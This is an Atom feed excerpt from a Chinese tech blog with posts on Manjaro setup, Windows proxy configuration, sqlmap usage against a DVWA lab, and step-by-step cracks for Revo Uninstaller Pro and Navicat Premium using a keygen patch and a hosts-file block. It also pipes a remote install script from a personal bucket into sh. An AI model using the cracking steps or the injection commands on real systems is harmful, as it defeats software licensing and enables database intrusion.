    <content type="html"><![CDATA[<div class="note quote cyan"><p>Manjaro Linux 安装及开发环境搭建。</p></div><span id="more"></span><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><a href="https://upyun.secriy.com/downloads/rufus-3.1p.exe">Rufus3.1</a>（镜像写入工具）</li><li>U 盘</li><li>Manjaro <a href="https://manjaro.org/downloads/official/kde/">镜像</a>（KDE）</li></ul><h3 id="写入镜像"><a href="#写入镜像" class="headerlink" title="写入镜像"></a>写入镜像</h3><ol><li><p>打开 Rufus 3.1</p></li><li><p>选择镜像，配置选项：</p><ul><li>按照图中配置，对分区类型有疑问请自行百度：</li></ul><p><img src="/start-with-manjaro/image-20200718100243163.png" class="lazyload" data-srcset="/start-with-manjaro/image-20200718100243163.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><ul><li>以下部分默认即可：</li></ul><p><img src="/start-with-manjaro/image-20200718100426743.png" class="lazyload" data-srcset="/start-with-manjaro/image-20200718100426743.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>点击开始，写入镜像。</p><blockquote><p><strong>务必要使用 DD 模式写入！！！</strong></p></blockquote></li></ol><h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><ol><li><p>插入 U 盘。</p></li><li><p>修改 BIOS，将 U 盘作为第一启动项。</p></li><li><p>重启电脑。</p></li><li><p>按照提示安装 Manjaro，最后重启电脑。</p><blockquote><p>分区：将 <em>/boot/efi</em> 分区（单硬盘）、<em>/boot</em> 分区挂载至 Windows 的 EFI（200MB）分区</p></blockquote></li></ol><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ol><li><p>换源：</p><pre><code class="shell">sudo pacman-mirrors -i -c China -m ranksudo nano /etc/pacman.conf# 写入以下内容[archlinuxcn]SigLevel=TrustedOnlyServer=https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</code></pre></li><li><p>安装 archlinuxcn-keyring：</p><pre><code class="shell">sudo pacman -S archlinuxcn-keyring</code></pre></li><li><p>更新系统：</p><pre><code class="shell">sudo pacman -Syyu</code></pre></li><li><p>安装 yay、配置清华源：</p><pre><code class="shell">sudo pacman -S yayyay --aururl &quot;https://aur.tuna.tsinghua.edu.cn&quot; --save</code></pre></li></ol><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><h4 id="必需软件"><a href="#必需软件" class="headerlink" title="必需软件"></a>必需软件</h4><ul><li><p>Vim</p><pre><code class="shell">yay -S vim</code></pre></li><li><p>输入法</p><pre><code class="shell">sudo pacman -Sy fcitxsudo pacman -S fcitx-sunpinyin # 输入法sudo pacman -S fcitx-configtool # 配置工具</code></pre><p>创建<code>.xprofile</code>文件：</p><pre><code class="shell">sudo vim ~/.xprofile</code></pre><p>写入内容：</p><pre><code class="shell">export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot;</code></pre><p>重启设备。</p></li><li><p>oh-my-zsh</p><pre><code class="shell">chsh -s /usr/bin/zsh # 修改默认shellsh -C &quot;$(wget https://acgfate-dl.oss-cn-shanghai.aliyuncs.com/install.sh -O -)&quot;sudo vim ~/.zshrc # 修改配置文件</code></pre><p>主题：ys</p><p>插件：</p><ul><li>git</li><li>zsh-autosuggestions</li><li>zsh-syntax-highlighting</li></ul></li></ul><h4 id="其他软件"><a href="#其他软件" class="headerlink" title="其他软件"></a>其他软件</h4><ul><li><p>V2RAY</p><blockquote><p>参考 <a href="https://github.com/v2ray/manual/blob/master/zh_cn/chapter_00/start.md">V2RAY 配置说明</a>。</p></blockquote><pre><code class="shell"># 安装yay -S v2ray# 配置sudo vim /etc/v2ray/config.json# 启动sudo systemctl start v2ray.service# 开机自启动sudo systemctl enable v2ray.service# 关闭sudo systemctl stop v2ray.service</code></pre></li><li><p>Chrome</p><pre><code class="shell">yay -S google-chrome</code></pre></li><li><p>WPS</p><pre><code class="shell">yay -S wps-officeyay -S ttf-wps-fonts</code></pre></li><li><p>deepin-screenshot（截图工具）</p><pre><code class="shell">yay -S deepin-screenshot</code></pre></li></ul><h3 id="KDE-美化"><a href="#KDE-美化" class="headerlink" title="KDE 美化"></a>KDE 美化</h3><ul><li><p>Plasma Widgets</p><ul><li>Active Window Control</li><li>Global Menu</li><li>Application Dashboard</li></ul></li><li><p>Latte Dock</p><pre><code class="shell">yay -S latte-dock</code></pre></li></ul><h3 id="界面展示"><a href="#界面展示" class="headerlink" title="界面展示"></a>界面展示</h3><p><img src="/start-with-manjaro/DeepinScreenshot.png" class="lazyload" data-srcset="/start-with-manjaro/DeepinScreenshot.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DeepinScreenshot"></p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Manjaro Linux 安装及开发环境搭建。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="Linux" scheme="https://blog.secriy.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>RevoUninstallerPro 安装破解</title>
    <link href="https://blog.secriy.com/revo-uninstall-pro-crack/"/>
    <id>https://blog.secriy.com/revo-uninstall-pro-crack/</id>
    <published>2020-06-17T11:01:32.000Z</published>
    <updated>2025-02-16T07:13:36.781Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Revo Uninstaller Pro 是一个用于卸载电脑上其他软件的程序，支持卸载时附带清理注册表和相关文件。</p></div><span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><ul><li><a href="https://upyun.secriy.com/downloads/RevoUninProSetup.exe">Revo Uninstaller Pro</a></li></ul><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><blockquote><p>直接运行安装程序安装即可，<strong>切记安装完成不要勾选打开软件，也不要手动启动软件，保证软件在破解前是关闭状态！</strong></p></blockquote><h2 id="破解软件"><a href="#破解软件" class="headerlink" title="破解软件"></a>破解软件</h2><ol><li><p>进入 <em>C:\ProgramData\VS Revo Group\Revo Uninstaller Pro</em> 目录，如果没有 <em>ProgramData</em> 文件夹请点击顶部<strong>查看</strong>按钮并勾选下图<strong>隐藏的项目</strong>选项：</p><p><img src="/revo-uninstall-pro-crack/image-20200617191142607.png" class="lazyload" data-srcset="/revo-uninstall-pro-crack/image-20200617191142607.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="fig1"></p></li><li><p>找到下图中的文件，右键–&gt;属性，勾选<strong>只读</strong>选项，最后点击<strong>应用</strong>或<strong>确定</strong>即破解完成：</p><p><img src="/revo-uninstall-pro-crack/image-20200617191313815.png" class="lazyload" data-srcset="/revo-uninstall-pro-crack/image-20200617191313815.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="fig2"></p></li><li><p>破解完成，可以正常使用 Revo Uninstaller Pro，永久激活。</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>必须使用本页面提供的软件，其他版本的软件未经测试不一定适用此方法破解。</li><li>请严格按照教程安装，安装完不能直接打开软件，如果不小心启动了请卸载重装并删除 <em>C:\ProgramData\VS Revo Group</em> 目录。</li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Revo Uninstaller Pro 是一个用于卸载电脑上其他软件的程序，支持卸载时附带清理注册表和相关文件。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="软件工具" scheme="https://blog.secriy.com/categories/software/"/>
    
    
    <category term="Software" scheme="https://blog.secriy.com/tags/Software/"/>
    
    <category term="Crack" scheme="https://blog.secriy.com/tags/Crack/"/>
    
  </entry>
  
  <entry>
    <title>Windows 代理配置</title>
    <link href="https://blog.secriy.com/windows-proxy-config/"/>
    <id>https://blog.secriy.com/windows-proxy-config/</id>
    <published>2020-06-02T05:15:22.000Z</published>
    <updated>2025-02-16T07:13:36.790Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Windows 下代理环境配置。</p></div><span id="more"></span><h2 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h2><ul><li><p>V2Ray</p><pre><code>socks5: 127.0.0.1:10808http: 127.0.0.1:10809</code></pre></li><li><p>Clash</p><pre><code>mixed: 127.0.0.1:1080</code></pre></li></ul><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><ul><li><p>git clone（GitHub）</p><ul><li><p>HTTP/HTTPS</p><p><em>C:\Users[用户名]\.gitconfig</em></p><pre><code>[http &quot;https://github.com&quot;]proxy = socks5://127.0.0.1:1080[https &quot;https://github.com&quot;]proxy = socks5://127.0.0.1:1080</code></pre></li><li><p>SSH</p><p><em>C:\Users[用户名]\.ssh\config</em></p><pre><code>Host github.com    User git    ProxyCommand connect -S 127.0.0.1:10808 -a none %h %p</code></pre></li></ul></li><li><p>npm<br><em>C:\Users[用户名]\.npmrc</em></p><pre><code>proxy=http://localhost:1080https-proxy=http://localhost:1080</code></pre></li><li><p>conda</p><p><em>C:\Users[用户名]\.condarc</em></p><pre><code>ssl_verify: truechannels:  - defaultsproxy_servers:  http: http://127.0.0.1:1080  https: https://127.0.0.1:1080</code></pre></li><li><p>pip</p><p><em>C:\Users[用户名]\pip\pip.ini</em></p><pre><code>[global]proxy = http://127.0.0.1:1080</code></pre></li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Windows 下代理环境配置。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="Network" scheme="https://blog.secriy.com/tags/Network/"/>
    
    <category term="Proxy" scheme="https://blog.secriy.com/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap 使用笔记</title>
    <link href="https://blog.secriy.com/sqlmap-note/"/>
    <id>https://blog.secriy.com/sqlmap-note/</id>
    <published>2020-05-09T15:28:14.000Z</published>
    <updated>2025-02-16T07:13:36.790Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>sqlmap 使用笔记。</p></div><span id="more"></span><h2 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h2><h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><pre><code class="bash">基本格式:sqlmap -u &quot;http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;`指定数据库:sqlmap -u &quot;http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --dbms mysql设置等级:sqlmap -u &quot;http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --level 1-5Cookie注入:sqlmap -u &quot;http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=1ridq2ikda0rviqnm9pm9bpnb6; security=low&quot;POST注入:sqlmap -u &quot;http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</code></pre><h3 id="数据库枚举"><a href="#数据库枚举" class="headerlink" title="数据库枚举"></a>数据库枚举</h3><pre><code class="bash">指定:--D  指定库--T  指定表--C  指定字段枚举:--dbs  枚举库--tables 枚举表--columns 枚举字段--schema 枚举数据库管理模式--batch  自动执行</code></pre><h3 id="全部选项"><a href="#全部选项" class="headerlink" title="全部选项"></a>全部选项</h3><pre><code class="bash">Usage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program&#39;s version number and exit  -v VERBOSE            Verbosity level: 0-6 (default 1)  Target:    At least one of these options has to be provided to define the    target(s)    -d DIRECT           Connection string for direct database connection    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file    -m BULKFILE         Scan multiple targets given in a textual file    -r REQUESTFILE      Load HTTP request from a file    -g GOOGLEDORK       Process Google dork results as target URLs    -c CONFIGFILE       Load options from a configuration INI file  Request:    These options can be used to specify how to connect to the target URL    --method=METHOD     Force usage of given HTTP method (e.g. PUT)    --data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)    --param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)    --cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)    --load-cookies=L..  File containing cookies in Netscape/wget format    --drop-set-cookie   Ignore Set-Cookie header from response    --user-agent=AGENT  HTTP User-Agent header value    --random-agent      Use randomly selected HTTP User-Agent header value    --host=HOST         HTTP Host header value    --referer=REFERER   HTTP Referer header value    -H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)    --auth-cred=AUTH..  HTTP authentication credentials (name:password)    --auth-file=AUTH..  HTTP authentication PEM cert/private key file    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)    --ignore-proxy      Ignore system default proxy settings    --ignore-redirects  Ignore redirection attempts    --ignore-timeouts   Ignore connection timeouts    --proxy=PROXY       Use a proxy to connect to the target URL    --proxy-cred=PRO..  Proxy authentication credentials (name:password)    --proxy-file=PRO..  Load proxy list from a file    --tor               Use Tor anonymity network    --tor-port=TORPORT  Set Tor proxy port other than default    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))    --check-tor         Check to see if Tor is used properly    --delay=DELAY       Delay in seconds between each HTTP request    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)    --retries=RETRIES   Retries when the connection timeouts (default 3)    --randomize=RPARAM  Randomly change value for given parameter(s)    --safe-url=SAFEURL  URL address to visit frequently during testing    --safe-post=SAFE..  POST data to send to a safe URL    --safe-req=SAFER..  Load safe HTTP request from a file    --safe-freq=SAFE..  Test requests between two visits to a given safe URL    --skip-urlencode    Skip URL encoding of payload data    --csrf-token=CSR..  Parameter used to hold anti-CSRF token    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token    --force-ssl         Force usage of SSL/HTTPS    --hpp               Use HTTP parameter pollution method    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)  Optimization:    These options can be used to optimize the performance of sqlmap    -o                  Turn on all optimization switches    --predict-output    Predict common queries output    --keep-alive        Use persistent HTTP(s) connections    --null-connection   Retrieve page length without actual HTTP response body    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)  Injection:    These options can be used to specify which parameters to test for,    provide custom injection payloads and optional tampering scripts    -p TESTPARAMETER    Testable parameter(s)    --skip=SKIP         Skip testing for given parameter(s)    --skip-static       Skip testing parameters that not appear to be dynamic    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)    --dbms=DBMS         Force back-end DBMS to provided value    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)    --os=OS             Force back-end DBMS operating system to provided value    --invalid-bignum    Use big numbers for invalidating values    --invalid-logical   Use logical operations for invalidating values    --invalid-string    Use random strings for invalidating values    --no-cast           Turn off payload casting mechanism    --no-escape         Turn off string escaping mechanism    --prefix=PREFIX     Injection payload prefix string    --suffix=SUFFIX     Injection payload suffix string    --tamper=TAMPER     Use given script(s) for tampering injection data  Detection:    These options can be used to customize the detection phase    --level=LEVEL       Level of tests to perform (1-5, default 1)    --risk=RISK         Risk of tests to perform (1-3, default 1)    --string=STRING     String to match when query is evaluated to True    --not-string=NOT..  String to match when query is evaluated to False    --regexp=REGEXP     Regexp to match when query is evaluated to True    --code=CODE         HTTP code to match when query is evaluated to True    --text-only         Compare pages based only on the textual content    --titles            Compare pages based only on their titles  Techniques:    These options can be used to tweak testing of specific SQL injection    techniques    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection    --union-char=UCHAR  Character to use for bruteforcing number of columns    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection    --dns-domain=DNS..  Domain name used for DNS exfiltration attack    --second-url=SEC..  Resulting page URL searched for second-order response    --second-req=SEC..  Load second-order HTTP request from file  Fingerprint:    -f, --fingerprint   Perform an extensive DBMS version fingerprint  Enumeration:    These options can be used to enumerate the back-end database    management system information, structure and data contained in the    tables. Moreover you can run your own SQL statements    -a, --all           Retrieve everything    -b, --banner        Retrieve DBMS banner    --current-user      Retrieve DBMS current user    --current-db        Retrieve DBMS current database    --hostname          Retrieve DBMS server hostname    --is-dba            Detect if the DBMS current user is DBA    --users             Enumerate DBMS users    --passwords         Enumerate DBMS users password hashes    --privileges        Enumerate DBMS users privileges    --roles             Enumerate DBMS users roles    --dbs               Enumerate DBMS databases    --tables            Enumerate DBMS database tables    --columns           Enumerate DBMS database table columns    --schema            Enumerate DBMS schema    --count             Retrieve number of entries for table(s)    --dump              Dump DBMS database table entries    --dump-all          Dump all DBMS databases tables entries    --search            Search column(s), table(s) and/or database name(s)    --comments          Check for DBMS comments during enumeration    -D DB               DBMS database to enumerate    -T TBL              DBMS database table(s) to enumerate    -C COL              DBMS database table column(s) to enumerate    -X EXCLUDE          DBMS database identifier(s) to not enumerate    -U USER             DBMS user to enumerate    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables    --pivot-column=P..  Pivot column name    --where=DUMPWHERE   Use WHERE condition while table dumping    --start=LIMITSTART  First dump table entry to retrieve    --stop=LIMITSTOP    Last dump table entry to retrieve    --first=FIRSTCHAR   First query output word character to retrieve    --last=LASTCHAR     Last query output word character to retrieve    --sql-query=QUERY   SQL statement to be executed    --sql-shell         Prompt for an interactive SQL shell    --sql-file=SQLFILE  Execute SQL statements from given file(s)  Brute force:    These options can be used to run brute force checks    --common-tables     Check existence of common tables    --common-columns    Check existence of common columns  User-defined function injection:    These options can be used to create custom user-defined functions    --udf-inject        Inject custom user-defined functions    --shared-lib=SHLIB  Local path of the shared library  File system access:    These options can be used to access the back-end database management    system underlying file system    --file-read=FILE..  Read a file from the back-end DBMS file system    --file-write=FIL..  Write a local file on the back-end DBMS file system    --file-dest=FILE..  Back-end DBMS absolute filepath to write to  Operating system access:    These options can be used to access the back-end database management    system underlying operating system    --os-cmd=OSCMD      Execute an operating system command    --os-shell          Prompt for an interactive operating system shell    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC    --os-bof            Stored procedure buffer overflow exploitation    --priv-esc          Database process user privilege escalation    --msf-path=MSFPATH  Local path where Metasploit Framework is installed    --tmp-path=TMPPATH  Remote absolute path of temporary files directory  Windows registry access:    These options can be used to access the back-end database management    system Windows registry    --reg-read          Read a Windows registry key value    --reg-add           Write a Windows registry key value data    --reg-del           Delete a Windows registry key value    --reg-key=REGKEY    Windows registry key    --reg-value=REGVAL  Windows registry key value    --reg-data=REGDATA  Windows registry key value data    --reg-type=REGTYPE  Windows registry key value type  General:    These options can be used to set some general working parameters    -s SESSIONFILE      Load session from a stored (.sqlite) file    -t TRAFFICFILE      Log all HTTP traffic into a textual file    --answers=ANSWERS   Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)    --base64=BASE64P..  Parameter(s) containing Base64 encoded data    --batch             Never ask for user input, use the default behavior    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)    --check-internet    Check Internet connection before assessing the target    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)    --charset=CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)    --eta               Display for each output the estimated time of arrival    --flush-session     Flush session files for current target    --forms             Parse and test forms on target URL    --fresh-queries     Ignore query results stored in session file    --har=HARFILE       Log all HTTP traffic into a HAR file    --hex               Use hex conversion during data retrieval    --output-dir=OUT..  Custom output directory path    --parse-errors      Parse and display DBMS error messages from responses    --preprocess=PRE..  Use given script(s) for preprocessing of response data    --repair            Redump entries having unknown character marker (?)    --save=SAVECONFIG   Save options to a configuration INI file    --scope=SCOPE       Regexp to filter targets from provided proxy log    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)    --update            Update sqlmap  Miscellaneous:    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)    --alert=ALERT       Run host OS command(s) when SQL injection is found    --beep              Beep on question and/or when SQL injection is found    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables    --dependencies      Check for missing (optional) sqlmap dependencies    --disable-coloring  Disable console output coloring    --gpage=GOOGLEPAGE  Use Google dork results from specified page number    --identify-waf      Make a thorough testing for a WAF/IPS protection    --list-tampers      Display list of available tamper scripts    --mobile            Imitate smartphone through HTTP User-Agent header    --offline           Work in offline mode (only use session data)    --purge             Safely remove all content from sqlmap data directory    --skip-waf          Skip heuristic detection of WAF/IPS protection    --smart             Conduct thorough tests only if positive heuristic(s)    --sqlmap-shell      Prompt for an interactive sqlmap shell    --tmp-dir=TMPDIR    Local directory for storing temporary files    --web-root=WEBROOT  Web server document root directory (e.g. &quot;/var/www&quot;)    --wizard            Simple wizard interface for beginner users</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;sqlmap 使用笔记。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="操作手册" scheme="https://blog.secriy.com/categories/manual/"/>
    
    
    <category term="Security" scheme="https://blog.secriy.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Navicat Premium 安装破解</title>
    <link href="https://blog.secriy.com/navicat-premium-crack/"/>
    <id>https://blog.secriy.com/navicat-premium-crack/</id>
    <published>2020-03-10T09:04:47.000Z</published>
    <updated>2025-02-16T07:13:36.777Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Navicat Premium 是一套多连接数据库开发工具，让你在单一应用程序中同时连接多达七种数据库：MySQL、MariaDB、MongoDB、SQL Server、SQLite、Oracle 和 PostgreSQL，可一次快速方便地访问所有数据库。</p></div><span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><ul><li><p><a href="http://download.navicat.com.cn/download/navicat150_premium_cs_x64.exe">Navicat Premium 15</a></p></li><li><p><a href="https://upyun.secriy.com/downloads/Navicat%20Keygen%20Patch%20v5.6.0%20DFoX.exe">破解程序</a></p></li></ul><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>下载 Navicat Premium 15 安装程序并直接运行安装，安装完毕请确保 Navicat Premium 处于<strong>关闭</strong>状态。</p><h2 id="破解软件"><a href="#破解软件" class="headerlink" title="破解软件"></a>破解软件</h2><ol><li><p>修改 hosts 文件（位置：<em>C:\Windows\System32\drivers\etc\hosts</em> ），添加以下文字并保存：</p><pre><code>127.0.0.1 activate.navicat.com</code></pre></li><li><p>将<strong>破解程序</strong>复制到 Navicat 安装目录（如图）：</p><p><img src="/navicat-premium-crack/image-20200617185711474.png" class="lazyload" data-srcset="/navicat-premium-crack/image-20200617185711474.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>启动破解程序。</p></li><li><p>点击图上的 <strong>Patch</strong>，显示成功即可：</p><p><img src="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170801-1583831824598.png" class="lazyload" data-srcset="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170801-1583831824598.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>启动 Navicat，第一次启动会提示试用，点击<strong>注册</strong>。</p></li><li><p>在破解程序内自定义注册名和组织（默认也可）：</p><p><img src="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170820-1583831875329.png" class="lazyload" data-srcset="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170820-1583831875329.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>点击 Generate：</p><p><img src="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170832.png" class="lazyload" data-srcset="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170832.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>第 7 步图中同一行框内会生成激活密钥，默认情况下会自动填入 Navicat 注册框内，点击<strong>激活</strong>，会提示无法联网，点击<strong>手动激活</strong>。</p></li><li><p>将 Navicat 手动激活生成的请求码复制到破解程序框内，点击左下角的 <strong>Generate</strong>：</p><p><img src="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170920.png" class="lazyload" data-srcset="/navicat-premium-crack/%E6%89%B9%E6%B3%A8%202020-03-10%20170920.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>将破解程序生成的激活码复制到 Navicat 激活框内，最后激活即可完成软件破解</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>请严格按照步骤进行破解。</li><li>如之前安装过软件导致破解失败，请使用 <strong>Revo Uninstaller Pro</strong> 卸载并清理注册表，再重新按照以上步骤操作。</li><li>进行第四步时请务必保证 Navicat Premium 15 处于<strong>关闭</strong>状态！</li></ul>]]></content>
    
    
